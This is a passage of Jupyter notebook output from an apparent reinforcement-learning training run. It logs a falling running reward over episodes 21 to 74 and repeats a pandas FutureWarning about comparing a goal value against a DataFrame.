      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -509.05\t Episode 21\t Frame count: 10697\t Context: 2\n",
      "Running reward: -509.05\t Episode 21\t Frame count: 10764\t Context: 2\n",
      "Running reward: -499.57\t Episode 22\t Frame count: 10790\t Context: 2\n",
      "Running reward: -499.57\t Episode 22\t Frame count: 11041\t Context: 2\n",
      "Running reward: -488.86\t Episode 23\t Frame count: 11074\t Context: 2\n",
      "Running reward: -488.86\t Episode 23\t Frame count: 11621\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -492.26\t Episode 24\t Frame count: 11811\t Context: 2\n",
      "Running reward: -492.26\t Episode 24\t Frame count: 12064\t Context: 2\n",
      "Running reward: -489.67\t Episode 25\t Frame count: 12198\t Context: 2\n",
      "Running reward: -489.67\t Episode 25\t Frame count: 12658\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -493.32\t Episode 26\t Frame count: 13433\t Context: 2\n",
      "Running reward: -493.32\t Episode 26\t Frame count: 13464\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -504.85\t Episode 27\t Frame count: 14716\t Context: 2\n",
      "Running reward: -504.85\t Episode 27\t Frame count: 14841\t Context: 2\n",
      "Running reward: -536.67\t Episode 28\t Frame count: 14856\t Context: 2\n",
      "Running reward: -536.67\t Episode 28\t Frame count: 15033\t Context: 2\n",
      "Running reward: -523.89\t Episode 29\t Frame count: 15185\t Context: 2\n",
      "Running reward: -523.89\t Episode 29\t Frame count: 15226\t Context: 2\n",
      "Running reward: -512.03\t Episode 30\t Frame count: 15240\t Context: 2\n",
      "Running reward: -512.03\t Episode 30\t Frame count: 15556\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -505.53\t Episode 31\t Frame count: 15890\t Context: 2\n",
      "Running reward: -505.53\t Episode 31\t Frame count: 15985\t Context: 2\n",
      "Running reward: -502.65\t Episode 32\t Frame count: 16195\t Context: 2\n",
      "Running reward: -502.65\t Episode 32\t Frame count: 16448\t Context: 2\n",
      "Running reward: -501.00\t Episode 33\t Frame count: 16634\t Context: 2\n",
      "Running reward: -501.00\t Episode 33\t Frame count: 16752\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -494.64\t Episode 34\t Frame count: 16944\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -494.64\t Episode 34\t Frame count: 17371\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -497.91\t Episode 35\t Frame count: 18087\t Context: 2\n",
      "Running reward: -497.91\t Episode 35\t Frame count: 18413\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -513.09\t Episode 36\t Frame count: 18587\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -513.09\t Episode 36\t Frame count: 18854\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -510.72\t Episode 37\t Frame count: 19182\t Context: 2\n",
      "Running reward: -510.72\t Episode 37\t Frame count: 19218\t Context: 2\n",
      "Running reward: -506.41\t Episode 38\t Frame count: 19223\t Context: 2\n",
      "Running reward: -506.41\t Episode 38\t Frame count: 19255\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -493.71\t Episode 39\t Frame count: 20626\t Context: 2\n",
      "Running reward: -493.71\t Episode 39\t Frame count: 21256\t Context: 2\n",
      "Running reward: -532.03\t Episode 40\t Frame count: 21271\t Context: 2\n",
      "Running reward: -532.03\t Episode 40\t Frame count: 22170\t Context: 2\n",
      "Running reward: -541.25\t Episode 41\t Frame count: 22325\t Context: 2\n",
      "Running reward: -541.25\t Episode 41\t Frame count: 22757\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -542.05\t Episode 42\t Frame count: 22839\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -542.05\t Episode 42\t Frame count: 23182\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -538.95\t Episode 43\t Frame count: 23491\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -538.95\t Episode 43\t Frame count: 23794\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -540.35\t Episode 44\t Frame count: 24622\t Context: 2\n",
      "Running reward: -540.35\t Episode 44\t Frame count: 24737\t Context: 2\n",
      "Running reward: -549.20\t Episode 45\t Frame count: 24773\t Context: 2\n",
      "Running reward: -549.20\t Episode 45\t Frame count: 24900\t Context: 2\n",
      "Running reward: -540.33\t Episode 46\t Frame count: 25084\t Context: 2\n",
      "Running reward: -540.33\t Episode 46\t Frame count: 25279\t Context: 2\n",
      "Running reward: -536.54\t Episode 47\t Frame count: 25352\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -536.54\t Episode 47\t Frame count: 25616\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -532.02\t Episode 48\t Frame count: 26368\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -532.02\t Episode 48\t Frame count: 26510\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -539.29\t Episode 49\t Frame count: 27849\t Context: 2\n",
      "Running reward: -539.29\t Episode 49\t Frame count: 28460\t Context: 2\n",
      "Running reward: -567.82\t Episode 50\t Frame count: 28662\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -567.82\t Episode 50\t Frame count: 28828\t Context: 2\n",
      "Running reward: -563.56\t Episode 51\t Frame count: 29507\t Context: 2\n",
      "Running reward: -563.56\t Episode 51\t Frame count: 30043\t Context: 2\n",
      "Running reward: -576.08\t Episode 52\t Frame count: 30061\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -576.08\t Episode 52\t Frame count: 30717\t Context: 2\n",
      "Running reward: -577.71\t Episode 53\t Frame count: 30968\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -577.71\t Episode 53\t Frame count: 32614\t Context: 2\n",
      "Running reward: -602.36\t Episode 54\t Frame count: 32631\t Context: 2\n",
      "Running reward: -602.36\t Episode 54\t Frame count: 32636\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -591.37\t Episode 55\t Frame count: 34630\t Context: 2\n",
      "Running reward: -591.37\t Episode 55\t Frame count: 35118\t Context: 2\n",
      "Running reward: -625.51\t Episode 56\t Frame count: 35742\t Context: 2\n",
      "Running reward: -625.51\t Episode 56\t Frame count: 36195\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -633.34\t Episode 57\t Frame count: 38591\t Context: 2\n",
      "Running reward: -633.34\t Episode 57\t Frame count: 39032\t Context: 2\n",
      "Running reward: -671.77\t Episode 58\t Frame count: 39045\t Context: 2\n",
      "Running reward: -671.77\t Episode 58\t Frame count: 39882\t Context: 2\n",
      "Running reward: -674.62\t Episode 59\t Frame count: 40366\t Context: 2\n",
      "Running reward: -674.62\t Episode 59\t Frame count: 40616\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -675.41\t Episode 60\t Frame count: 42140\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -675.41\t Episode 60\t Frame count: 43237\t Context: 2\n",
      "Running reward: -707.62\t Episode 61\t Frame count: 43265\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -707.62\t Episode 61\t Frame count: 46954\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -756.74\t Episode 62\t Frame count: 49312\t Context: 2\n",
      "Running reward: -756.74\t Episode 62\t Frame count: 51313\t Context: 2\n",
      "Running reward: -814.63\t Episode 63\t Frame count: 52367\t Context: 2\n",
      "Running reward: -814.63\t Episode 63\t Frame count: 52474\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -819.92\t Episode 64\t Frame count: 53020\t Context: 2\n",
      "Running reward: -819.92\t Episode 64\t Frame count: 53910\t Context: 2\n",
      "Running reward: -829.34\t Episode 65\t Frame count: 54754\t Context: 2\n",
      "Running reward: -829.34\t Episode 65\t Frame count: 55249\t Context: 2\n",
      "Running reward: -836.98\t Episode 66\t Frame count: 55320\t Context: 2\n",
      "Running reward: -836.98\t Episode 66\t Frame count: 55895\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -833.89\t Episode 67\t Frame count: 57899\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -833.89\t Episode 67\t Frame count: 59018\t Context: 2\n",
      "Running reward: -867.87\t Episode 68\t Frame count: 59175\t Context: 2\n",
      "Running reward: -867.87\t Episode 68\t Frame count: 60319\t Context: 2\n",
      "Running reward: -874.04\t Episode 69\t Frame count: 60343\t Context: 2\n",
      "Running reward: -874.04\t Episode 69\t Frame count: 61600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -879.75\t Episode 70\t Frame count: 70545\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1010.00\t Episode 71\t Frame count: 72706\t Context: 2\n",
      "Running reward: -1010.00\t Episode 71\t Frame count: 76832\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1069.30\t Episode 72\t Frame count: 78980\t Context: 2\n",
      "Running reward: -1069.30\t Episode 72\t Frame count: 82742\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1136.35\t Episode 73\t Frame count: 87367\t Context: 2\n",
      "Running reward: -1136.35\t Episode 73\t Frame count: 87389\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1184.26\t Episode 74\t Frame count: 89297\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1184.26\t Episode 74\t Frame count: 91881\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
